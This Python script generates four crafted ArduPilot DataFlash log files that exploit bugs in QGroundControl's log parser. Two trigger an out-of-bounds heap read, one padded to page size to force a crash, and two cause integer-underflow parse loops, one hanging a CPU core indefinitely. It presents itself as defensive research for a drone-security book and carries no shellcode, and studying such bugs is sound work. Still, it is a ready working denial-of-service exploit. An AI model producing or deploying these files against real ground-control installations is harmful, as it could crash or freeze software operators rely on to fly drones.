#!/usr/bin/env python3
"""
make_malicious_bin.py — craft malicious ArduPilot DataFlash (.bin) logs that
exercise QGC-04 in QGroundControl's APMDataFlash parser
(src/Utilities/Parsing/APMDataFlash/APMDataFlashUtility.cc).

DEFENSIVE security research tooling for a published drone-security book.
Authorized white-box review; localhost / bench testing only; BENIGN payloads
only. The files emitted here contain NO shellcode and NO destructive content —
they are minimal DataFlash records whose only purpose is to drive the parser's
size accounting off the rails so the bug is observable (ideally under ASAN).

Two independent variants are produced:

  oob_overread.bin
    Triggers CWE-125 (out-of-bounds heap read). The FMT record that declares the
    final log message uses format string "Qa" (8-byte TimeUS + one 64-byte array
    field) but a declared on-wire 'length' of 15 (= 3-byte header + 12-byte body:
    8 real TimeUS bytes + 4 bytes of fake 'a' data). iterateMessages slices only
    12 body bytes for the record, but parseMessage re-derives the field size from
    the FORMAT string via formatCharSize('a') == 64 and calls
    parseValue(data+8, 'a') -> QByteArray(data+8, 64). When this record is the
    LAST thing in the file, 60 bytes are read past the end of the mapped buffer
    (file is 205 bytes; the 'a' field reads data[201..265), valid range [0..205)).
    The leading TimeUS field is NOT needed to trigger the bug -- it's there so
    the benign TEST.TimeUS/TEST.x fields register as "plottable" in QGC's Log
    Viewer (QGC's field-plottability check requires a recognized timestamp key;
    see README.md), giving a visible signal that the file parsed at all. The
    hostile 'a'-type field is a raw byte array and will never itself count as
    plottable -- its effect, without ASAN, is a silent heap-adjacent read.

  underflow_stall.bin
    Triggers CWE-191 (integer underflow). A FMT record declares a message type
    whose 'length' byte is 1. In iterateMessages, payloadSize = fmt.length - 3
    becomes -2 (a negative int). The guard `pos + payloadSize > size` then reads
    as `pos - 2 > size`, which is FALSE, so the bounds check is bypassed; the
    callback is invoked with a negative payloadSize and `pos += payloadSize`
    REWINDS the cursor. The parser re-reads the same region forever (progress
    stalls / effective hang) — a denial-of-service on the parse thread.

DataFlash binary layout (little-endian), as parsed by APMDataFlashUtility.cc:
  Every record:        0xA3 0x95 <msgType:u8> <body...>
  FMT record body (msgType == 128, kFmtMessageType), kFmtPayloadSize == 86 bytes:
       Type   : u8     (the message type this FMT describes)
       Length : u8     (TOTAL on-wire record length incl. the 3-byte header)
       Name   : char[4]
       Format : char[16]
       Columns: char[64]

Usage:
    python3 make_malicious_bin.py [output_dir]
        # default output_dir = directory of this script
"""
import os
import struct
import sys

HEADER1 = 0xA3
HEADER2 = 0x95
FMT_TYPE = 128            # kFmtMessageType
FMT_PAYLOAD_SIZE = 86     # kFmtPayloadSize (body after the 3-byte header)


def fmt_record(msg_type, length, name, fmt, columns):
    """Build a complete FMT record: 3-byte header + 86-byte FMT body."""
    assert 0 <= msg_type <= 255
    assert 0 <= length <= 255
    body = struct.pack("<BB", msg_type, length)          # Type, Length
    body += name.encode("latin-1")[:4].ljust(4, b"\x00")   # Name  char[4]
    body += fmt.encode("latin-1")[:16].ljust(16, b"\x00")  # Format char[16]
    body += columns.encode("latin-1")[:64].ljust(64, b"\x00")  # Columns char[64]
    assert len(body) == FMT_PAYLOAD_SIZE, len(body)
    return bytes([HEADER1, HEADER2, FMT_TYPE]) + body


def data_record(msg_type, body):
    """Build a non-FMT data record: 3-byte header + raw body."""
    return bytes([HEADER1, HEADER2, msg_type]) + body


def build_oob_overread():
    """
    Final record declares format 'Qa' (8-byte TimeUS + 64-byte array) but a
    declared 'length' that only covers 4 bytes of the 'a' field's body. Placed
    last in the file so the 64-byte read runs off the end of the buffer.

    Both FMT records lead with a real 'Q' (uint64) TimeUS field/column, matching
    the convention every real ArduPilot DataFlash message follows. This matters
    for OBSERVING the bug in QGC's Log Viewer, not for triggering it: QGC's
    "Fields: N" counter only counts *plottable* fields, and a field only
    qualifies as plottable if the parsed record carries a recognized timestamp
    key ("TimeUS"/"TimeMS"/"Time") -- see LogViewerDataFlashParser.cc's
    haveTimestamp/_extractTimestampSeconds. Earlier revisions of this script
    omitted TimeUS entirely, so EVERY field -- benign or hostile -- was
    guaranteed to show "Fields: 0" in the UI regardless of whether the
    out-of-bounds read fired. Adding TimeUS makes the benign TEST.TimeUS/TEST.x
    fields plottable (a visible "it parsed" signal); the hostile 'a'-type field
    is a raw QByteArray and will never itself count as plottable, timestamp or
    not -- its effect (if any, without ASAN) is a silent heap-adjacent read, not
    a chartable value.
    """
    out = b""

    # Benign type 1: "TEST", format "QB" (8-byte TimeUS + 1-byte "x"),
    # length = 3 (header) + 8 + 1 = 12.
    out += fmt_record(1, 12, "TEST", "QB", "TimeUS,x")
    out += data_record(1, struct.pack("<Q", 0) + bytes([0x42]))  # 9-byte body, matches length-3 == 9

    # Hostile type 2: format "Qa" (8-byte TimeUS + formatCharSize('a') == 64
    # byte array) but declared length = 15 -> iterateMessages payloadSize =
    # 15 - 3 = 12 body bytes (8 real TimeUS + 4 bytes of fake 'a' data).
    out += fmt_record(2, 15, "EVIL", "Qa", "TimeUS,blob")

    # The hostile DATA record: 12 body bytes are present (8-byte TimeUS + 4
    # fake leading bytes of the 'a' field) and it is LAST in the file.
    # iterateMessages slices 12 bytes (in-bounds: pos+12 == size). parseMessage
    # reads 'Q' (8 bytes, in-bounds) then parseValue(data+8, 'a') ->
    # QByteArray(data+8, 64) -- reads 64 bytes starting 8 bytes into this
    # record's body, but only 4 of those are real (the DE AD BE EF below) ->
    # 60-byte over-read past end-of-buffer, same magnitude as before.
    out += data_record(2, struct.pack("<Q", 0) + bytes([0xDE, 0xAD, 0xBE, 0xEF]))

    return out


def build_oob_overread_pagecross(page_size=None):
    """
    Same CWE-125 mechanism as build_oob_overread(), but pads the file so the
    final hostile record sits exactly at the end of a single memory-mapped
    page, to force an actual crash without needing an ASAN build.

    QFile::map() (used by both DataFlashParser::parseFile and
    APMDataFlashLogParser) reserves whole OS pages. A small file like plain
    oob_overread.bin (205 bytes) still gets one full page mapped (4096 or
    16384 bytes depending on platform), and the 60-byte over-read lands
    harmlessly inside that same page's zero-padding -- confirmed live: QGC
    shows "Fields: 3" (EVIL.TimeUS, TEST.TimeUS, TEST.x), no fault, because
    the read never leaves the mapped page.

    Padding the file to be EXACTLY one page in size, with the hostile 'a'
    field's read window starting 4 bytes before the page boundary, makes the
    64-byte read spill 60 bytes into the NEXT page -- not part of this
    mapping, and for an isolated single-page mmap, usually unmapped. This is
    a strong (not airtight -- adjacent-mapping layout isn't contractually
    guaranteed by the OS) way to get a deterministic SIGSEGV/crash.
    """
    if page_size is None:
        try:
            page_size = os.sysconf("SC_PAGE_SIZE")  # macOS/Linux
        except (AttributeError, ValueError):
            page_size = 4096  # Windows fallback; os.sysconf doesn't exist there

    out = b""

    # Benign type 1: identical to build_oob_overread().
    out += fmt_record(1, 12, "TEST", "QB", "TimeUS,x")
    out += data_record(1, struct.pack("<Q", 0) + bytes([0x42]))

    # Hostile type 2 FMT: same "Qa" shape as build_oob_overread().
    out += fmt_record(2, 15, "EVIL", "Qa", "TimeUS,blob")

    # Zero-padding filler so the file lands at exactly `page_size` bytes once
    # the final 15-byte hostile DATA record is appended below. iterateMessages'
    # header-resync scan (searching for the next 0xA3 0x95) skips harmlessly
    # over this padding -- it costs extra scan iterations, not correctness.
    HOSTILE_RECORD_LEN = 15  # 3-byte header + 8-byte TimeUS + 4 fake 'a' bytes
    pad_len = page_size - len(out) - HOSTILE_RECORD_LEN
    assert pad_len >= 0, "page_size too small for the preceding records"
    out += bytes(pad_len)

    # The hostile DATA record: identical body to build_oob_overread(), but now
    # its 'a' field starts reading 4 bytes before the page boundary, so the
    # 64-byte read spills 60 bytes into the (usually unmapped) next page.
    out += data_record(2, struct.pack("<Q", 0) + bytes([0xDE, 0xAD, 0xBE, 0xEF]))

    assert len(out) == page_size, (len(out), page_size)
    return out


def build_underflow_stall():
    """
    A FMT whose Length byte is 1 -> payloadSize = 1 - 3 = -2 in iterateMessages.
    The `pos + payloadSize > size` guard is bypassed and `pos += payloadSize`
    rewinds the cursor, stalling the parse loop.
    """
    out = b""

    # Benign type 1 so parseFmtMessages returns a non-empty format map and
    # iterateMessages enters its loop.
    out += fmt_record(1, 4, "TEST", "B", "x")
    out += data_record(1, bytes([0x42]))

    # Hostile type 3 with Length = 1  ->  payloadSize = -2 (underflow).
    out += fmt_record(3, 1, "HANG", "B", "x")

    # A record of the hostile type. pos advances by 3 (header), then
    # pos += (-2) rewinds to header+1; the loop never makes forward progress.
    out += data_record(3, bytes([0x00]))

    return out


def build_underflow_hang():
    """
    THE deterministic variant: FMT Length = 0  ->  payloadSize = 0 - 3 = -3.

    Both parse loops do `pos += 3` to consume the header and then
    `pos += payloadSize`, so a payloadSize of exactly -3 means NET ZERO
    MOVEMENT and the same record is re-parsed forever:

      parseFmtMessages   (APMDataFlashUtility.cc, skip path)
          pos += 3;
          ...
          else if (formats.contains(msgType)) { pos += formats[msgType].length - 3; }

      iterateMessages    (APMDataFlashUtility.cc)
          pos += 3;
          const int payloadSize = fmt.length - 3;
          if (pos + payloadSize > size) break;   // negative -> guard passes
          pos += payloadSize;

    parseFmtMessages runs FIRST, so the hang happens during the format scan --
    before any message is even iterated. Length=1 (the other generator) yields
    payloadSize=-2, i.e. net +1: a byte-at-a-time crawl that still terminates.
    Only Length=0 is a true non-advancing loop.

    Expected: the QGC parse thread pins one core at 100% and never returns.
    """
    out = b""

    # Benign type 1 so the format map is non-empty and the loops are entered.
    out += fmt_record(1, 4, "TEST", "B", "x")
    out += data_record(1, bytes([0x42]))

    # Hostile type 4, Length = 0  ->  payloadSize = -3  ->  net zero movement.
    out += fmt_record(4, 0, "HANG0", "B", "x")

    # One record of the hostile type. This is where the cursor sticks.
    out += data_record(4, bytes([0x00]))

    return out


def main():
    out_dir = sys.argv[1] if len(sys.argv) > 1 else os.path.dirname(os.path.abspath(__file__))
    os.makedirs(out_dir, exist_ok=True)

    variants = {
        "oob_overread.bin": build_oob_overread(),
        "oob_overread_pagecross.bin": build_oob_overread_pagecross(),
        "underflow_stall.bin": build_underflow_stall(),
        "underflow_hang.bin": build_underflow_hang(),
    }

    for name, blob in variants.items():
        path = os.path.join(out_dir, name)
        with open(path, "wb") as f:
            f.write(blob)
        print("wrote %s (%d bytes)" % (path, len(blob)))

    print("\nLoad each file in QGroundControl via:")
    print("  Analyze > GeoTag Images  (select the .bin as the flight log), or")
    print("  Analyze > Log Viewer / Log Analyzer (open the .bin).")
    print("oob_overread.bin           -> silent over-read; QGC shows Fields: 3, no crash")
    print("oob_overread_pagecross.bin -> same bug, padded to page size; should CRASH QGC")
    print("underflow_stall.bin        -> Length=1, payloadSize=-2, net +1: slow crawl, terminates")
    print("underflow_hang.bin         -> Length=0, payloadSize=-3, NET ZERO: infinite loop, 100% CPU")
    print("Run QGC under AddressSanitizer for a full heap-buffer-overflow trace on either")
    print("oob_overread.bin or oob_overread_pagecross.bin.")


if __name__ == "__main__":
    main()
